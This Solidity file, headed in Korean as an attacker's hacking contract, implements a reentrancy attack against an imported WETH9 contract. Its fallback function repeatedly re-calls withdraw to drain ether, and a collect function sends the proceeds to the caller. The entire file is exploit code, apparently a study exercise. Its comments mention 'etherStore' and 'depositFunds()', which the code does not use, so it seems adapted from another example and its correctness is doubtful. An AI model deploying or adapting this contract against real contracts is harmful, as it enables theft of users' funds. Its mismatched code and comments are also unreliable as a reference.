// 공격자의 hacker 컨트랙트

pragma solidity ^0.4.25;


import "./랩이더.sol";

contract atack {
  WETH9 public wETH9;

  // intialize the etherStore variable with the contract address
  constructor(address _wETH9address) {
      wETH9 = WETH9(_wETH9address);
  }

  function attackEtherStore() external payable {
      // attack to the nearest ether
      require(msg.value >= 0.1 ether);
      // send eth to the depositFunds() function
      wETH9.deposit.value(0.1 ether)();
      // start the magic
      wETH9.withdraw(0.1 ether);
  }

  function collectEther() public {
      msg.sender.transfer(this.balance);
  }

  // fallback function - where the magic happens
  function () payable {
      if (wETH9.balance > 0.1 ether) {
          wETH9.withdraw(0.1 ether);
      }
  }
}